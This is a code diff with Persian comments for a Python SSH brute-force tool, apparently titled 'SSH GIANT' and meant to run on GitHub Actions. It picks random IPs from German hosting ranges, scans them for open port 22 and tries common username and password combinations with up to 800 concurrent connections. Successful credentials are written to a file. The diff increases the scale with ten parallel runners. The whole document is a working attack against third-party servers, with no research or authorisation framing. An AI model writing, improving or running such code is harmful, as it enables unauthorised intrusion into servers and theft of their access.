@@ -7,12 +7,15 @@ import os
 import sys
 from datetime import datetime
 
-# ------------------- تنظیمات -------------------
-SSH_TIMEOUT = 2          # ثانیه برای اتصال SSH
-MAX_WORKERS = 300        # تعداد کارگر همزمان (در اکشن می‌توان بالا برد)
-TARGET_RATE = 500        # آرزوی ما، ولی عملاً به 50-100 می‌رسیم
+# =================== تنظیمات انفجاری ===================
+SSH_TIMEOUT = 1.0          # تایم‌اوت اتصال (ثانیه) - خیلی کم
+CONNECTION_LIMIT = 800     # حداکثر کانکشن همزمان کل
+NUM_RUNNERS = 10           # ۱۰ رانر موازی
+TASKS_PER_RUNNER = 80      # هر رانر ۸۰ کارگر → جمعاً ۸۰۰ کارگر
+MAX_IPS = 2000             # حداکثر آی‌پی برای تولید
+MAX_PASSWORDS = 1000       # حداکثر رمز برای تولید
 
-# رنج‌های IPv4 معروف آلمان (Hetzner, Contabo, etc.)
+# رنج‌های آلمان (Hetzner, Contabo, ...)
 GERMAN_RANGES = [
     "136.243.0.0/16", "5.9.0.0/16", "78.46.0.0/15", "85.10.192.0/18",
     "88.198.0.0/16", "95.216.0.0/15", "116.203.0.0/16", "138.201.0.0/16",
@@ -31,9 +34,9 @@ BASE_PASSWORDS = [
     "toor", "Passw0rd", "P@ssw0rd", "welcome", "login"
 ]
 
-# ------------------- توابع رانرها -------------------
-def generate_ips_from_ranges(ranges, max_ips=3000):
-    """تولید حداکثر max_ips آی‌پی تصادفی از رنج‌های داده شده"""
+# =================== توابع رانرها ===================
+def generate_ips_from_ranges(ranges, max_ips=MAX_IPS):
+    """تولید آی‌پی تصادفی از رنج‌ها"""
     all_ips = set()
     for r in ranges:
         try:
@@ -41,19 +44,17 @@ def generate_ips_from_ranges(ranges, max_ips=3000):
             hosts = list(net.hosts())
             if not hosts:
                 continue
-            sample = min(80, len(hosts))  # از هر رنج حداکثر 80 تا
+            sample = min(100, len(hosts))
             for ip in random.sample(hosts, sample):
                 all_ips.add(str(ip))
                 if len(all_ips) >= max_ips:
-                    break
-            if len(all_ips) >= max_ips:
-                break
+                    return list(all_ips)
         except:
             continue
-    return list(all_ips)[:max_ips]
+    return list(all_ips)
 
-async def check_port_22(ip, timeout=1.5):
-    """TCP connect به پورت 22 برای تشخیص زنده بودن (جایگزین پینگ)"""
+async def check_port_22(ip, timeout=0.5):
+    """TCP connect به پورت 22 - خیلی سریع"""
     try:
         loop = asyncio.get_running_loop()
         conn = asyncio.open_connection(ip, 22)
@@ -62,9 +63,13 @@ async def check_port_22(ip, timeout=1.5):
     except:
         return False
 
-async def scan_alive_ips(ip_list):
-    """اسکن همزمان پورت 22 روی همه آی‌پی‌ها"""
-    tasks = [check_port_22(ip) for ip in ip_list]
+async def scan_alive_ips(ip_list, max_concurrent=500):
+    """اسکن همزمان پورت 22 با حداکثر ۵۰۰ کانکشن همزمان"""
+    sem = asyncio.Semaphore(max_concurrent)
+    async def limited_check(ip):
+        async with sem:
+            return await check_port_22(ip)
+    tasks = [limited_check(ip) for ip in ip_list]
     results = await asyncio.gather(*tasks)
     return [ip for ip, alive in zip(ip_list, results) if alive]
 
@@ -74,7 +79,7 @@ def generate_usernames():
             f.write(u + "\n")
     print(f"[+] {len(COMMON_USERNAMES)} usernames saved.")
 
-def generate_passwords(count=800):
+def generate_passwords(count=MAX_PASSWORDS):
     passwords = set(BASE_PASSWORDS)
     while len(passwords) < count:
         base = random.choice(BASE_PASSWORDS)
@@ -111,83 +116,125 @@ async def test_ssh(ip, username, password, semaphore, stop_event):
             pass
         return None
 
-async def main_attacker(alive_ips, usernames, passwords):
-    total = len(alive_ips) * len(usernames) * len(passwords)
-    print(f"[*] Total combinations: {total}")
-    sem = asyncio.Semaphore(MAX_WORKERS)
-    stop = asyncio.Event()
-    tasks = []
-    for ip in alive_ips:
+async def runner_worker(queue, semaphore, stop_event, runner_id, results_queue):
+    """هر رانر یک کارگر است که از صف ترکیب‌ها می‌گیرد و تست می‌کند"""
+    while not stop_event.is_set():
+        try:
+            item = await asyncio.wait_for(queue.get(), timeout=0.5)
+        except asyncio.TimeoutError:
+            continue
+        if item is None:
+            queue.task_done()
+            break
+        ip, user, pwd = item
+        result = await test_ssh(ip, user, pwd, semaphore, stop_event)
+        if result:
+            await results_queue.put(result)
+            stop_event.set()
+        queue.task_done()
+
+async def runner_manager(runner_id, ip_list, usernames, passwords, global_semaphore, stop_event, results_queue):
+    """مدیریت یک رانر: ایجاد صف اختصاصی و کارگرهای درون آن"""
+    queue = asyncio.Queue()
+    # پر کردن صف با ترکیب‌های مربوط به این رانر (تقسیم کار بین رانرها)
+    # برای سادگی، هر رانر همه ترکیب‌ها رو می‌گیره ولی با یک offset
+    total_combinations = len(ip_list) * len(usernames) * len(passwords)
+    step = NUM_RUNNERS
+    start_idx = runner_id
+    count = 0
+    for i, ip in enumerate(ip_list):
+        if (i % step) != start_idx:
+            continue
         for user in usernames:
             for pwd in passwords:
-                tasks.append(test_ssh(ip, user, pwd, sem, stop))
-                if len(tasks) > 10000:  # جلوگیری از مصرف بیش از حد حافظه
+                if stop_event.is_set():
                     break
-            if len(tasks) > 10000:
+                await queue.put((ip, user, pwd))
+                count += 1
+            if stop_event.is_set():
                 break
-        if len(tasks) > 10000:
+        if stop_event.is_set():
             break
-    results = await asyncio.gather(*tasks)
-    for res in results:
-        if res:
-            ip, user, pwd = res
-            with open("success.txt", "w") as f:
-                f.write(f"IP: {ip}\nUSER: {user}\nPASSWORD: {pwd}\n")
-            print(f"\n🟢 SUCCESS: {ip} | {user} | {pwd}")
-            return True
-    return False
+    print(f"[Runner {runner_id}] Loaded {count} tasks.")
+    # ایجاد کارگرهای درون این رانر
+    workers = []
+    for _ in range(TASKS_PER_RUNNER):
+        w = asyncio.create_task(runner_worker(queue, global_semaphore, stop_event, runner_id, results_queue))
+        workers.append(w)
+    await queue.join()
+    for _ in workers:
+        await queue.put(None)
+    await asyncio.gather(*workers)
 
 async def main():
-    print("="*50)
-    print("   SSH GIANT - GitHub Actions Edition")
-    print(f"Start: {datetime.now()}")
-    print("="*50)
+    print("="*60)
+    print("   🔥 SSH GIANT - 10 Parallel Runners 🔥")
+    print(f"   Start: {datetime.now()}")
+    print(f"   {NUM_RUNNERS} Runners x {TASKS_PER_RUNNER} Workers = {NUM_RUNNERS*TASKS_PER_RUNNER} Total Concurrent")
+    print("="*60)
 
-    # Runner 1
-    print("\n[Runner 1] Generating IPs from German ranges...")
-    ips = generate_ips_from_ranges(GERMAN_RANGES, max_ips=2500)
-    with open("all_ips.txt", "w") as f:
-        for ip in ips:
-            f.write(ip + "\n")
-    print(f"[+] {len(ips)} IPs generated.")
+    # مرحله 1: تولید آی‌پی
+    print("\n[1/5] Generating IPs from German ranges...")
+    all_ips = generate_ips_from_ranges(GERMAN_RANGES, max_ips=MAX_IPS)
+    print(f"      {len(all_ips)} IPs generated.")
 
-    # Runner 2
-    print("\n[Runner 2] Scanning alive IPs (port 22)...")
-    alive = await scan_alive_ips(ips)
-    with open("alive_ips.txt", "w") as f:
-        for ip in alive:
-            f.write(ip + "\n")
-    print(f"[+] {len(alive)} IPs are alive.")
-
-    if not alive:
-        print("[!] No alive IPs found. Exiting.")
+    # مرحله 2: اسکن زنده‌ها
+    print("\n[2/5] Scanning alive IPs (port 22) with high speed...")
+    alive_ips = await scan_alive_ips(all_ips, max_concurrent=500)
+    print(f"      {len(alive_ips)} IPs are reachable.")
+    if not alive_ips:
+        print("[!] No alive IPs. Exiting.")
         return
 
-    # Runner 3
-    print("\n[Runner 3] Generating usernames...")
+    # مرحله 3: تولید یوزرنیم
+    print("\n[3/5] Generating usernames...")
     generate_usernames()
     with open("usernames.txt") as f:
         usernames = [l.strip() for l in f if l.strip()]
 
-    # Runner 4
-    print("\n[Runner 4] Generating passwords...")
-    generate_passwords(600)
+    # مرحله 4: تولید رمز
+    print("\n[4/5] Generating passwords...")
+    generate_passwords(MAX_PASSWORDS)
     with open("passwords.txt") as f:
         passwords = [l.strip() for l in f if l.strip()]
 
-    # Main Runner
-    print("\n[Main Runner] Starting brute force... (MAX_WORKERS={})".format(MAX_WORKERS))
-    success = await main_attacker(alive, usernames, passwords)
+    # مرحله 5: حمله اصلی با ۱۰ رانر موازی
+    print(f"\n[5/5] Launching {NUM_RUNNERS} parallel runners with {TASKS_PER_RUNNER} workers each...")
+    global_semaphore = asyncio.Semaphore(CONNECTION_LIMIT)
+    stop_event = asyncio.Event()
+    results_queue = asyncio.Queue()
+
+    runner_tasks = []
+    for i in range(NUM_RUNNERS):
+        task = asyncio.create_task(runner_manager(i, alive_ips, usernames, passwords, global_semaphore, stop_event, results_queue))
+        runner_tasks.append(task)
+
+    # منتظر اولین نتیجه موفق
+    success = None
+    try:
+        success = await asyncio.wait_for(results_queue.get(), timeout=None)
+    except:
+        pass
+    finally:
+        stop_event.set()
+        await asyncio.gather(*runner_tasks, return_exceptions=True)
 
     if success:
-        print("\n✅ Attack succeeded! Check success.txt artifact.")
+        ip, user, pwd = success
+        print("\n" + "="*60)
+        print("🟢🟢🟢 SUCCESS! 🟢🟢🟢")
+        print(f"IP: {ip}")
+        print(f"User: {user}")
+        print(f"Password: {pwd}")
+        print("="*60)
+        with open("success.txt", "w") as f:
+            f.write(f"IP: {ip}\nUSER: {user}\nPASSWORD: {pwd}\n")
     else:
-        print("\n❌ No credentials found.")
+        print("\n❌ No credentials found after full scan.")
 
-    print(f"End: {datetime.now()}")
+    print(f"\nEnd: {datetime.now()}")
 
 if __name__ == "__main__":
-    # نصب sshpass در اکشن (اگر نبود)
     if os.system("command -v sshpass > /dev/null 2>&1") != 0:
         os.system("sudo apt update && sudo apt install -y sshpass")
     asyncio.run(main())
